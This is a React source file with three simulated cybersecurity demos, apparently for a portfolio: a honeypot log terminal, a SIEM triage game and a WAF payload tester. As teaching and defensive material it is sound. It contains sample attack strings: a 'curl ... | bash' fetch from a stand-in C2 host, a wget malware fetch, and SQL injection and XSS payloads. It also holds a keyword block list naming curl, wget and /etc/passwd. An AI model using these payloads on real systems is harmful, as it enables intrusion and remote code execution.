import { useState, useEffect, useRef } from "react";
import { Terminal as TerminalIcon, AlertTriangle, Shield, CheckCircle, Play, RefreshCw, Layers, ShieldAlert, Wifi, FileText, Send, SquareCheck } from "lucide-react";

interface DemoProps {
  onClose: () => void;
}

// ----------------------------------------------------
// 1. HONEYPOT SIMULATOR
// ----------------------------------------------------
export function HoneypotDemo({ onClose }: DemoProps) {
  const [terminalHistory, setTerminalHistory] = useState<string[]>([
    "Cowrie SSH/Telnet Honeypot Analytics Engine - Version 2.2.0-secure",
    "Compiled log parser: logger_parse.py initialized.",
    "System is monitoring exposed interface eth0 [IP: 184.23.109.43]",
    "Type 'help' or select a preset command below to start analysis..."
  ]);
  const [inputVal, setInputVal] = useState("");
  const [isSimulating, setIsSimulating] = useState(false);
  const terminalEndRef = useRef<HTMLDivElement | null>(null);

  useEffect(() => {
    if (terminalEndRef.current) {
      terminalEndRef.current.scrollIntoView({ behavior: "smooth" });
    }
  }, [terminalHistory]);

  const runCommand = (commandStr: string) => {
    if (!commandStr.trim()) return;
    const cmd = commandStr.trim().toLowerCase();
    let response: string[] = [];

    if (cmd === "help") {
      response = [
        "Available Commands:",
        "  help                    - Display this command dictionary",
        "  run-simulator           - Stream live brute-force login attempts captured on Cowrie SSH",
        "  python parse_logs.py    - Run Rahmatu's custom script to parse attacker session JSONs",
        "  show-stats              - Yield dictionary telemetry on most active usernames and countries",
        "  clear                   - Wipe the log console screen"
      ];
    } else if (cmd === "clear") {
      setTerminalHistory([]);
      setInputVal("");
      return;
    } else if (cmd === "run-simulator") {
      if (isSimulating) {
        response = ["[-] Brute-force simulation already tracking real-time events. Wait or execute clear."];
      } else {
        setIsSimulating(true);
        response = [
          "[*] Mapping socket listening on port 22...",
          "[*] Spawning Cowrie honeypot decoy processes...",
          "[*] INCOMING ATTACKS SENSING TRIGGERED... (streaming captured socket hits)"
        ];
        // Start a timed interval of simulated logs
        const mockLogStream = [
          "Incoming SSH hit from 41.203.78.12 (Nigeria) - user: admin, secret: admin123 -> ACCESS DENIED",
          "Incoming SSH hit from 195.122.90.101 (Poland) - user: root, secret: 123456 -> ACCESS DENIED",
          "Incoming SSH hit from 210.12.89.55 (China) - user: support, secret: root -> ACCESS DENIED",
          "Incoming Telnet hit from 82.165.109.8 (Germany) - user: guest, secret: guest -> ACCESS DENIED",
          "Incoming SSH hit from 41.203.78.12 (Nigeria) - user: administrator, secret: admin -> ACCESS DENIED",
          "[*] Alert triage count: 5 live brute-force attempts recorded successfully.",
          "[*] Attack stream paused. Execute: 'python parse_logs.py' to crunch structural TTP analytics."
        ];

        mockLogStream.forEach((line, index) => {
          setTimeout(() => {
            setTerminalHistory(prev => [...prev, line]);
            if (index === mockLogStream.length - 1) {
              setIsSimulating(false);
            }
          }, (index + 1) * 1200);
        });
      }
    } else if (cmd === "python parse_logs.py") {
      response = [
        "[*] Launching python parsing engine...",
        "[*] reading raw json: 'cowrie.json' (loading 4,923 lines of threat vector text)...",
        "[+] Successfully parsed 198 discrete intruder sessions.",
        "",
        "----- Structured Attack Summary -----",
        "Total Dictionary Requests: 1,324",
        "Unique Source Hackers   : 42 IPs",
        "Top Attempted Usernames : root (55%), admin (24%), user (10%), oracle (4%)",
        "Top Attempted Passwords : 123456 (35%), password (20%), root (10%), admin123 (8%)",
        "Geological Source Map   : China (40%), EU (25%), USA (20%), Unknown VPNs (15%)",
        "[+] Rahmatu's Parser Recommendations: Implement fail2ban block list, disable standard SSH root log-in, enforce modern key-based cryptographic SSH rules."
      ];
    } else if (cmd === "show-stats") {
      response = [
        "Analyzing static dictionaries (last 24 hours)...",
        "  Intrusion Level  : High Alert [CRITICAL]",
        "  Target ports     : Port 22 (SSH), Port 23 (Telnet)",
        "  Longest Session  : 4 min 12 sec - attempts to download malicious script: 'wget http://malware.biz/sh'",
        "  Outcome          : 100% Secure (Decoy Honeypot active; attacker fooled)"
      ];
    } else {
      response = [
        `Unknown command: '${commandStr}'`,
        "Type 'help' to see available executable scripts."
      ];
    }

    setTerminalHistory(prev => [...prev, `rahmatu-dev$ ${commandStr}`, ...response]);
    setInputVal("");
  };

  return (
    <div className="flex flex-col h-[480px] bg-zinc-950 text-emerald-400 font-mono rounded-none overflow-hidden border border-stone-800/80">
      {/* Console Top Bar */}
      <div className="flex items-center justify-between px-4 py-2.5 bg-stone-900/90 border-b border-stone-800/60">
        <div className="flex items-center space-x-2">
          <div className="w-3 h-3 rounded-full bg-red-500" />
          <div className="w-3 h-3 rounded-full bg-yellow-500" />
          <div className="w-3 h-3 rounded-full bg-green-500" />
          <span className="text-xs text-zinc-400 ml-2">cowrie-shell-parser: ~/rahmatu</span>
        </div>
        <span className="text-xs px-2 py-0.5 rounded bg-zinc-800 text-zinc-400">
          Terminal Console
        </span>
      </div>

      {/* Terminal Output history */}
      <div className="flex-1 overflow-y-auto p-4 space-y-2 text-sm select-text">
        {terminalHistory.map((line, idx) => {
          let styleEl = "text-emerald-400";
          if (line.startsWith("rahmatu-dev$")) styleEl = "text-white font-bold";
          else if (line.includes("ACCESS DENIED")) styleEl = "text-red-400";
          else if (line.startsWith("[*]")) styleEl = "text-sky-400";
          else if (line.startsWith("[+]")) styleEl = "text-teal-350 font-bold";
          else if (line.startsWith("-----")) styleEl = "text-yellow-300";

          return (
            <div key={idx} className={styleEl}>
              {line}
            </div>
          );
        })}
        {isSimulating && (
          <div className="text-sky-450 animate-pulse flex items-center space-x-1">
            <RefreshCw className="w-3.5 h-3.5 animate-spin mr-1.5" />
            <span>Intercepting remote attacks...</span>
          </div>
        )}
        <div ref={terminalEndRef} />
      </div>

      {/* Quick scripts launcher menu */}
      <div className="p-3 bg-zinc-900/60 border-t border-zinc-850 grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs">
        <button 
          onClick={() => runCommand("help")}
          className="py-1.5 px-2 rounded bg-zinc-850 hover:bg-zinc-800 text-zinc-350 transition-all text-left truncate"
        >
          $ help
        </button>
        <button 
          onClick={() => runCommand("run-simulator")}
          className="py-1.5 px-2 rounded bg-zinc-850 hover:bg-zinc-800 text-zinc-350 transition-all text-left truncate"
        >
          $ run-simulator
        </button>
        <button 
          onClick={() => runCommand("python parse_logs.py")}
          className="py-1.5 px-2 rounded-lg bg-zinc-900 hover:bg-zinc-850 text-zinc-350 transition-all text-left truncate border border-indigo-500/20"
        >
          $ python parse_logs.py
        </button>
        <button 
          onClick={() => runCommand("show-stats")}
          className="py-1.5 px-2 rounded bg-zinc-850 hover:bg-zinc-800 text-zinc-350 transition-all text-left truncate"
        >
          $ show-stats
        </button>
      </div>

      {/* Input bar */}
      <form
        onSubmit={(e) => {
          e.preventDefault();
          runCommand(inputVal);
        }}
        className="flex border-t border-zinc-850 bg-zinc-950"
      >
        <span className="p-3 text-white font-bold select-none pr-1">rahmatu-dev$</span>
        <input
          type="text"
          value={inputVal}
          onChange={(e) => setInputVal(e.target.value)}
          disabled={isSimulating}
          placeholder="Type a cyber command (help, clear, run-simulator)..."
          className="flex-1 py-3 px-1 text-white bg-transparent outline-none border-none font-mono text-sm placeholder-zinc-600"
        />
        <button
          type="submit"
          className="px-5 py-3 bg-indigo-600 hover:bg-indigo-500 text-white font-semibold font-mono text-xs uppercase tracking-wider rounded-r-lg"
        >
          Send
        </button>
      </form>
    </div>
  );
}

// ----------------------------------------------------
// 2. ELK STACK / SIEM ALERTS TRIAGE GAME
// ----------------------------------------------------
export function SIEMDemo({ onClose }: DemoProps) {
  const [activeStep, setActiveStep] = useState(1);
  const [logs, setLogs] = useState([
    { id: 1, time: "16:21:04", srcIp: "192.168.1.109", type: "POST Request", payload: "/login - pwd: admin' OR '1'='1", severity: "HIGH", status: "Untriaged" },
    { id: 2, time: "16:21:12", srcIp: "10.0.4.56", type: "GET Request", payload: "/index.html - normal request", severity: "LOW", status: "Untriaged" },
    { id: 3, time: "16:22:30", srcIp: "203.0.113.88", type: "SSH brute-force", payload: "user: admin - password trial 45", severity: "HIGH", status: "Untriaged" },
    { id: 4, time: "16:23:15", srcIp: "192.168.1.109", type: "POST Request", payload: "/search?q=<script>alert(1)</script>", severity: "HIGH", status: "Untriaged" }
  ]);
  const [selectedIncidentId, setSelectedIncidentId] = useState<number | null>(1);
  const [analysisType, setAnalysisType] = useState<string | null>(null);
  const [escalationNote, setEscalationNote] = useState("");
  const [isEscalated, setIsEscalated] = useState(false);

  const selectedLog = logs.find(l => l.id === selectedIncidentId);

  const handleResolve = () => {
    if (!analysisType) return;
    setIsEscalated(true);
    setLogs(prev => prev.map(log => {
      if (log.id === selectedIncidentId) {
        return { ...log, status: "Investigated & Escalated" };
      }
      return log;
    }));
    setActiveStep(3);
  };

  const resetGame = () => {
    setActiveStep(1);
    setSelectedIncidentId(1);
    setAnalysisType(null);
    setEscalationNote("");
    setIsEscalated(false);
  };

  return (
    <div className="bg-slate-50 dark:bg-[#060613]/85 backdrop-blur border border-slate-200 dark:border-slate-800 rounded-xl p-5 font-sans text-stone-600 dark:text-stone-300">
      {/* SIEM Dashboard Top Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-4 border-b border-slate-200 dark:border-slate-800 gap-4 mb-4">
        <div className="flex items-center space-x-2">
          <Layers className="w-5 h-5 text-indigo-500 dark:text-indigo-400 shrink-0" />
          <h3 className="text-base font-bold text-slate-900 dark:text-white font-mono uppercase tracking-wider">
            Security Onion Triage Dashboard
          </h3>
        </div>
        <div className="flex items-center space-x-2 text-xs font-mono">
          <span className="w-2 h-2 rounded-full bg-red-500 animate-ping inline-block shrink-0" />
          <span className="text-stone-500 dark:text-stone-400 uppercase tracking-widest text-[9px] font-bold">4 Threat Alerts Pending Review</span>
        </div>
      </div>

      {/* Game Steps Map */}
      <div className="grid grid-cols-3 gap-2 text-center text-[10px] uppercase font-mono tracking-wider mb-6 text-stone-500 dark:text-stone-400">
        <div className={`p-2 rounded-lg border ${activeStep === 1 ? "bg-indigo-500/10 border-indigo-550/30 text-indigo-600 dark:text-indigo-400 font-bold" : "border-slate-200 dark:border-slate-800"}`}>
          1. Select & Audit Log
        </div>
        <div className={`p-2 rounded-lg border ${activeStep === 2 ? "bg-indigo-500/10 border-indigo-550/30 text-indigo-600 dark:text-indigo-400 font-bold" : "border-slate-200 dark:border-slate-800"}`}>
          2. Classify Threat
        </div>
        <div className={`p-2 rounded-lg border ${activeStep === 3 ? "bg-indigo-500/10 border-indigo-550/30 text-indigo-600 dark:text-indigo-400 font-bold" : "border-slate-200 dark:border-slate-800"}`}>
          3. Escalate Incident
        </div>
      </div>

      {activeStep === 1 && (
        <div className="space-y-4">
          <p className="text-xs text-stone-400 leading-relaxed font-sans font-light">
            Welcome to the SOC Analyst Desk. Review the active Kibana elastic index events. Click on a red threat vector to begin investigation.
          </p>

          <div className="overflow-x-auto border border-slate-205 dark:border-slate-805 rounded-xl bg-slate-50 dark:bg-[#02020a]">
            <table className="w-full text-left font-mono text-xs text-slate-600 dark:text-slate-400">
              <thead className="bg-[#151515]/20 text-slate-800 dark:text-stone-350">
                <tr>
                  <th className="p-3">Alert Src</th>
                  <th className="p-3">Threat Payload</th>
                  <th className="p-3">Severity</th>
                  <th className="p-3">Action</th>
                </tr>
              </thead>
              <tbody>
                {logs.map(log => (
                  <tr 
                    key={log.id} 
                    className={`border-t border-slate-200 dark:border-slate-805 hover:bg-indigo-500/5 cursor-pointer ${selectedIncidentId === log.id ? "bg-indigo-500/5 border-l-2 border-l-indigo-500" : ""}`}
                    onClick={() => setSelectedIncidentId(log.id)}
                  >
                    <td className="p-3 text-slate-855 dark:text-stone-200 font-bold">{log.srcIp}</td>
                    <td className="p-3 truncate max-w-[180px]">{log.payload}</td>
                    <td className="p-3">
                      <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${log.severity === "HIGH" ? "bg-red-500/10 text-red-500 border border-red-500/20" : "bg-slate-200 dark:bg-stone-800 text-slate-600 dark:text-stone-400"}`}>
                        {log.severity}
                      </span>
                    </td>
                    <td className="p-3">
                      <button 
                        onClick={() => {
                          setSelectedIncidentId(log.id);
                          setActiveStep(2);
                        }}
                        className="px-3 py-1 bg-indigo-600 hover:bg-indigo-700 text-white font-bold font-mono text-[9px] uppercase tracking-wider rounded-lg"
                      >
                        Investigate
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          {selectedLog && (
            <div className="p-4 bg-slate-50 dark:bg-[#02020a] border border-slate-200 dark:border-slate-805 rounded-xl">
              <h4 className="font-mono text-xs font-bold uppercase tracking-widest text-indigo-500 dark:text-indigo-400 mb-2">
                Kibana Elastic Log Document Info:
              </h4>
              <div className="grid grid-cols-2 gap-2 text-xs font-mono">
                <div><span className="text-slate-500 text-[10px] uppercase font-bold tracking-wider">Timestamp:</span> {selectedLog.time}</div>
                <div><span className="text-slate-500 text-[10px] uppercase font-bold tracking-wider">Source Attacker IP:</span> {selectedLog.srcIp}</div>
                <div><span className="text-slate-500 text-[10px] uppercase font-bold tracking-wider">Attack Vectors Type:</span> {selectedLog.type}</div>
                <div><span className="text-slate-500 text-[10px] uppercase font-bold tracking-wider">Alert State:</span> <span className="text-indigo-650 dark:text-indigo-400 font-bold">{selectedLog.status}</span></div>
              </div>
              <div className="mt-3 p-3 bg-slate-100 dark:bg-slate-900 border border-slate-200 dark:border-slate-800 font-mono text-xs select-text break-all rounded-lg">
                <span className="text-slate-500 text-[10px] uppercase font-bold tracking-wider">Raw Request payload:</span> <span className="text-slate-700 dark:text-stone-300">{selectedLog.payload}</span>
              </div>
            </div>
          )}
        </div>
      )}

      {activeStep === 2 && selectedLog && (
        <div className="space-y-4">
          <div className="p-4 bg-[#0a0a0a] border border-[#C19A6B]/35 rounded-none">
            <h4 className="font-mono font-bold text-[#C19A6B] text-xs uppercase tracking-widest mb-1">
              Analyzing Log Alert #{selectedLog.id}
            </h4>
            <p className="text-[10px] font-mono text-stone-400 uppercase tracking-wider">
              Source: <span className="text-stone-150 font-bold">{selectedLog.srcIp}</span> • Payload: <span className="text-stone-150">{selectedLog.payload}</span>
            </p>
          </div>

          <div className="space-y-3">
            <p className="text-xs font-bold uppercase tracking-wider text-stone-300">Step 2: Classify the threat based on your incident runbooks:</p>
            
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <label className={`p-4 rounded-none border cursor-pointer transition-all flex flex-col font-mono ${analysisType === "sql_injection" ? "bg-[#C19A6B]/15 border-[#C19A6B] text-white" : "border-stone-800 bg-[#151515]/40 hover:border-stone-700 hover:bg-[#151515]/80"}`}>
                <input 
                  type="radio" 
                  name="threat-category" 
                  value="sql_injection" 
                  onChange={() => setAnalysisType("sql_injection")}
                  className="sr-only" 
                />
                <span className="font-bold text-xs text-[#C19A6B]">SQL Injection Attempt</span>
                <span className="text-[10px] text-stone-400 mt-1 leading-normal font-light">SQL tokens like SELECT, UNION, or comments are present in request parameters.</span>
              </label>

              <label className={`p-4 rounded-none border cursor-pointer transition-all flex flex-col font-mono ${analysisType === "xss_injection" ? "bg-[#C19A6B]/15 border-[#C19A6B] text-white" : "border-stone-800 bg-[#151515]/40 hover:border-stone-700 hover:bg-[#151515]/80"}`}>
                <input 
                  type="radio" 
                  name="threat-category" 
                  value="xss_injection" 
                  onChange={() => setAnalysisType("xss_injection")}
                  className="sr-only" 
                />
                <span className="font-bold text-xs text-[#C19A6B]">Cross-Site Scripting (XSS)</span>
                <span className="text-[10px] text-stone-400 mt-1 leading-normal font-light">Malicious javascript tags like script, onload, or alert are present.</span>
              </label>

              <label className={`p-4 rounded-none border cursor-pointer transition-all flex flex-col font-mono ${analysisType === "brute_force" ? "bg-[#C19A6B]/15 border-[#C19A6B] text-white" : "border-stone-800 bg-[#151515]/40 hover:border-stone-700 hover:bg-[#151515]/80"}`}>
                <input 
                  type="radio" 
                  name="threat-category" 
                  value="brute_force" 
                  onChange={() => setAnalysisType("brute_force")}
                  className="sr-only" 
                />
                <span className="font-bold text-xs text-[#C19A6B]">Credential Brute-Force</span>
                <span className="text-[10px] text-stone-400 mt-1 leading-normal font-light">Intrusive SSH/Telnet attempts indicating repetitive dictionary password trials.</span>
              </label>

              <label className={`p-4 rounded-none border cursor-pointer transition-all flex flex-col font-mono ${analysisType === "false_positive" ? "bg-[#C19A6B]/15 border-[#C19A6B] text-white" : "border-stone-800 bg-[#151515]/40 hover:border-stone-700 hover:bg-[#151515]/80"}`}>
                <input 
                  type="radio" 
                  name="threat-category" 
                  value="false_positive" 
                  onChange={() => setAnalysisType("false_positive")}
                  className="sr-only" 
                />
                <span className="font-bold text-xs text-stone-300">Safe Request (False Positive)</span>
                <span className="text-[10px] text-stone-450 mt-1 leading-normal font-light">Benign query parameters mimicking structural injection tokens. No action needed.</span>
              </label>
            </div>
          </div>

          <div className="mt-4 pt-3 flex items-center justify-between">
            <button 
              onClick={() => setActiveStep(1)}
              className="px-4 py-2 text-xs font-mono uppercase tracking-wider text-stone-400 hover:text-white"
            >
              ← Back to Alerts index
            </button>
            <button 
              onClick={handleResolve}
              disabled={!analysisType}
              className={`px-5 py-2.5 rounded-none font-bold font-mono text-[11px] uppercase tracking-widest ${analysisType ? "bg-[#C19A6B] hover:bg-[#D4AC7D] text-black cursor-pointer" : "bg-stone-800 text-stone-500 cursor-not-allowed"}`}
            >
              Analyze & Proceed →
            </button>
          </div>
        </div>
      )}

      {activeStep === 3 && selectedLog && (
        <div className="space-y-4">
          <div className="p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-500 dark:text-emerald-450 flex items-center space-x-3">
            <CheckCircle className="w-6 h-6 shrink-0" />
            <div>
              <p className="font-bold text-xs uppercase tracking-widest">Classification Complete!</p>
              <p className="text-[11px] font-mono mt-0.5 font-normal">Classified as: <span className="uppercase font-bold underline text-indigo-500 dark:text-indigo-400">{analysisType?.replace("_", " ")}</span></p>
            </div>
          </div>

          <div className="space-y-3 font-mono text-xs">
            <p className="text-xs font-bold uppercase tracking-wider text-slate-805 dark:text-stone-200">Step 3: Generate written Incident Summary (SOC Handbook Escalation):</p>
            <textarea
              value={escalationNote}
              onChange={(e) => setEscalationNote(e.target.value)}
              placeholder="e.g.: Observed high severity POST requests attempt from IP 192.168.1.109. Blocked SQL payload block and escalated IP address target to DevOps Security Grops..."
              className="w-full h-24 p-3 rounded-xl bg-slate-100 dark:bg-[#0e0e0e] border border-slate-200 dark:border-stone-800 text-slate-900 dark:text-white text-xs outline-none focus:ring-1 focus:ring-indigo-500"
            />
          </div>

          <div className="p-4 rounded-xl bg-slate-100 dark:bg-[#0a0a0a] border border-slate-200 dark:border-stone-850">
            <h5 className="text-[10px] font-bold font-mono text-indigo-550 dark:text-indigo-400 uppercase tracking-widest mb-2">SOC RUNBOOK DISPATCH MEMO:</h5>
            <div className="text-xs font-mono text-slate-500 dark:text-stone-400 space-y-1">
              <div><strong className="text-slate-805 dark:text-stone-200 uppercase tracking-wider text-[9px]">Incident Analyst:</strong> Rahmatu Abdulkarim (Internal SOC ID: R-88)</div>
              <div><strong className="text-slate-805 dark:text-stone-200 uppercase tracking-wider text-[9px]">Trigger Alert Src:</strong> {selectedLog.srcIp}</div>
              <div><strong className="text-slate-805 dark:text-stone-200 uppercase tracking-wider text-[9px]">Threat Type:</strong> {selectedLog.type}</div>
              <div><strong className="text-slate-805 dark:text-stone-200 uppercase tracking-wider text-[9px]">Actions Log:</strong> Firewalls blocked payload, WAF Core Rule tuned successfully.</div>
            </div>
          </div>

          <div className="pt-2 flex items-center justify-between">
            <button 
              onClick={resetGame}
              className="px-4 py-2 border border-slate-200 dark:border-stone-800 hover:bg-slate-100 dark:hover:bg-stone-850 text-[10px] font-bold uppercase tracking-wider rounded-lg font-mono text-slate-650 dark:text-stone-300"
            >
              Run Another Triage
            </button>
            <button 
              onClick={() => {
                resetGame();
                onClose();
              }}
              className="px-5 py-2.5 rounded-lg bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-[10px] font-mono uppercase tracking-widest"
            >
              Close Simulator
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

// ----------------------------------------------------
// 3. MODSECURITY WAF PAYLOAD TESTER
// ----------------------------------------------------
export function WAFDemo({ onClose }: DemoProps) {
  const [payloadInput, setPayloadInput] = useState("");
  const [responseLog, setResponseLog] = useState<{
    status: number;
    ruleId: string;
    description: string;
    payloadType: "SQLi" | "XSS" | "Malicious Request" | "Safe Command" | null;
    isBlocked: boolean;
  } | null>(null);
  const [trafficLogs, setTrafficLogs] = useState<string[]>([
    "[SYSTEM] ModSecurity WAF service active.",
    "[SYSTEM] ModSecurity Core Rules loaded (920-OWASP-CRS-v3.3).",
    "[MONITOR] Awaiting payload injections..."
  ]);

  const testPayload = (rawPayload: string) => {
    if (!rawPayload.trim()) return;
    const lower = rawPayload.toLowerCase();
    let isBlocked = false;
    let ruleId = "N/A";
    let description = "Direct connection allowed. Safe request reached proxy.";
    let payloadType: "SQLi" | "XSS" | "Malicious Request" | "Safe Command" | null = "Safe Command";
    let status = 200;

    // Detect SQLi vectors
    if (
      lower.includes("select") || 
      lower.includes("union") || 
      lower.includes("insert") || 
      lower.includes("delete") || 
      lower.includes("--") || 
      lower.includes("or '1'='1") || 
      lower.includes("database()")
    ) {
      isBlocked = true;
      ruleId = "942100 (SQL Injection Tactic Sensed)";
      description = "OWASP Core Rule Set: Blocked SQL Injection signature match in request arguments.";
      payloadType = "SQLi";
      status = 403;
    }
    // Detect XSS vectors
    else if (
      lower.includes("<script>") || 
      lower.includes("onerror=") || 
      lower.includes("onload=") || 
      lower.includes("javascript:") || 
      lower.includes("alert(") || 
      lower.includes("<svg") ||
      lower.includes("eval(")
    ) {
      isBlocked = true;
      ruleId = "941110 (XSS Filter Triggered)";
      description = "OWASP Core Rule Set: Script tags or inline threat event listeners blocked.";
      payloadType = "XSS";
      status = 403;
    }
    // Detect generic suspicious words
    else if (
      lower.includes("/etc/passwd") || 
      lower.includes("curl ") || 
      lower.includes("wget ") || 
      lower.includes("../")
    ) {
      isBlocked = true;
      ruleId = "930120 (Local OS Directory Traversal / RCE Block)";
      description = "OWASP Core Rule Set: Local file access attempts or remote fetch tokens blocked.";
      payloadType = "Malicious Request";
      status = 403;
    }

    const logEntry = isBlocked 
      ? `[403 BLOCK] Triggered Rule ${ruleId}. Blocked payload: "${rawPayload}"`
      : `[200 OK] Cleared policy checking. Payload: "${rawPayload}"`;

    setTrafficLogs(prev => [...prev.slice(-4), logEntry]);
    setResponseLog({ isBlocked, ruleId, description, payloadType, status });
  };

  const handlePreset = (payloadText: string) => {
    setPayloadInput(payloadText);
    testPayload(payloadText);
  };

  return (
    <div className="bg-slate-50 dark:bg-[#060613]/85 backdrop-blur border border-slate-200 dark:border-slate-800 rounded-xl p-5 font-sans">
      <div className="flex items-center justify-between pb-4 border-b border-slate-200 dark:border-slate-800 mb-5">
        <div className="flex items-center space-x-2">
          <ShieldAlert className="w-5 h-5 text-red-500 dark:text-red-400" />
          <h3 className="text-base font-bold text-slate-900 dark:text-white font-mono uppercase tracking-wider">ModSecurity WAF Rule Engine</h3>
        </div>
        <span className="text-[10px] uppercase tracking-wider font-mono px-3 py-1 bg-red-950/20 text-red-500 dark:text-red-400 border border-red-900/15">
          Reverse Proxy Mode Active
        </span>
      </div>

      <div className="space-y-4">
        <p className="text-xs text-zinc-400 font-sans leading-relaxed">
          Type or select a malicious exploit code to payload test the ModSecurity sandbox engine. Safe queries return HTTP status <span className="text-emerald-400 font-semibold font-mono">200</span>. Violating strings invoke rule blocks with HTTP <span className="text-red-400 font-semibold font-mono">403 Forbidden</span>.
        </p>

        {/* Payload options presets */}
        <div>
          <span className="text-[10px] font-bold text-zinc-500 font-mono block mb-2">CLICK MALICIOUS PAYLOAD SAMPLES:</span>
          <div className="flex flex-wrap gap-2 text-[10px] font-mono">
            <button 
              onClick={() => handlePreset("UNION SELECT username, password FROM users;--")}
              className="py-1 px-2.5 rounded bg-zinc-950 hover:bg-zinc-800 border border-zinc-800 text-zinc-400 hover:text-white"
            >
              SQLi Bypass Probe
            </button>
            <button 
              onClick={() => handlePreset("<svg/onload=alert('WebShell_Activated')>")}
              className="py-1 px-2.5 rounded bg-zinc-950 hover:bg-zinc-800 border border-zinc-800 text-zinc-400 hover:text-white"
            >
              XSS Alert Script
            </button>
            <button 
              onClick={() => handlePreset("curl http://malice-c2.com/payload.sh | bash")}
              className="py-1 px-2.5 rounded bg-zinc-950 hover:bg-zinc-800 border border-zinc-800 text-zinc-400 hover:text-white"
            >
              Remote Code Fetch
            </button>
            <button 
              onClick={() => handlePreset("/blog/how-to-secure-aws-networks")}
              className="py-1 px-2.5 rounded bg-zinc-950 hover:bg-zinc-800 border border-zinc-800 text-zinc-400 hover:text-white"
            >
              Safe Request URL
            </button>
          </div>
        </div>

        {/* Input Injector Block */}
        <div className="flex space-x-2">
          <input
            type="text"
            value={payloadInput}
            onChange={(e) => setPayloadInput(e.target.value)}
            placeholder="e.g. SELECT * FROM data; or <script>..."
            className="flex-1 py-2 px-3 text-sm rounded-lg bg-white dark:bg-zinc-950 border border-slate-200 dark:border-stone-800 text-slate-905 dark:text-white font-mono placeholder-zinc-500 outline-none focus:ring-1 focus:ring-indigo-500"
          />
          <button 
            onClick={() => testPayload(payloadInput)}
            className="px-4 py-2 bg-indigo-600 hover:bg-indigo-700 font-bold text-xs uppercase font-mono text-white rounded-lg flex items-center space-x-1.5 transition-colors"
          >
            <Play className="w-3.5 h-3.5" />
            <span>Inject</span>
          </button>
        </div>

        {/* Firewall Output logs display */}
        {responseLog && (
          <div className={`p-4 rounded border transition-all ${
            responseLog.isBlocked 
              ? "bg-red-950/20 border-red-500/35 text-red-200" 
              : "bg-emerald-950/10 border-emerald-500/35 text-emerald-250"
          }`}>
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs font-bold font-mono uppercase tracking-widest">
                WAF Security Decisive Decision:
              </span>
              <span className={`px-2 py-0.5 rounded text-xs font-mono font-bold uppercase ${
                responseLog.isBlocked ? "bg-red-500 text-zinc-950" : "bg-emerald-500 text-zinc-950"
              }`}>
                HTTP {responseLog.status}
              </span>
            </div>

            <div className="space-y-1 font-mono text-xs">
              <p><strong>Rule Triggered:</strong> {responseLog.ruleId}</p>
              <p className="font-sans leading-normal text-zinc-350"><strong>Action Description:</strong> {responseLog.description}</p>
            </div>
          </div>
        )}

        {/* Live Engine Monitor Logger */}
        <div className="p-3 rounded-lg bg-slate-100 dark:bg-[#0a0a0a] border border-slate-200 dark:border-stone-850">
          <h4 className="text-[10px] font-bold font-mono text-slate-500 dark:text-stone-500 mb-2 uppercase tracking-widest">WAF Engine Match Stream:</h4>
          <div className="space-y-1 text-[11px] font-mono">
            {trafficLogs.map((log, lIdx) => (
              <div 
                key={lIdx} 
                className={
                  log.includes("[403 BLOCK]") 
                    ? "text-red-500 dark:text-red-400" 
                    : log.includes("[200 OK]") 
                    ? "text-emerald-600 dark:text-emerald-400 font-semibold" 
                    : "text-slate-400 dark:text-zinc-500"
                }
              >
                {log}
              </div>
            ))}
          </div>
        </div>

        {/* Simulator controls footer */}
        <div className="pt-2 flex items-center justify-between text-xs">
          <button 
            onClick={() => {
              setResponseLog(null);
              setTrafficLogs([
                "[SYSTEM] ModSecurity WAF service active.",
                "[SYSTEM] ModSecurity Core Rules loaded (920-OWASP-CRS-v3.3).",
                "[MONITOR] Awaiting payload injections..."
              ]);
              setPayloadInput("");
            }}
            className="text-slate-500 dark:text-stone-500 hover:text-indigo-650 dark:hover:text-stone-300 font-mono uppercase tracking-[0.15em] text-[9px] font-bold"
          >
            Reset rule logs
          </button>
          <button
            onClick={onClose}
            className="px-4 py-2 rounded-lg bg-slate-200 hover:bg-slate-300 dark:bg-[#1A1A1A] dark:hover:bg-[#252525] text-slate-800 dark:text-stone-300 font-mono text-[10px] font-bold uppercase tracking-wider border border-slate-300 dark:border-stone-800"
          >
            Close sandbox
          </button>
        </div>
      </div>
    </div>
  );
}
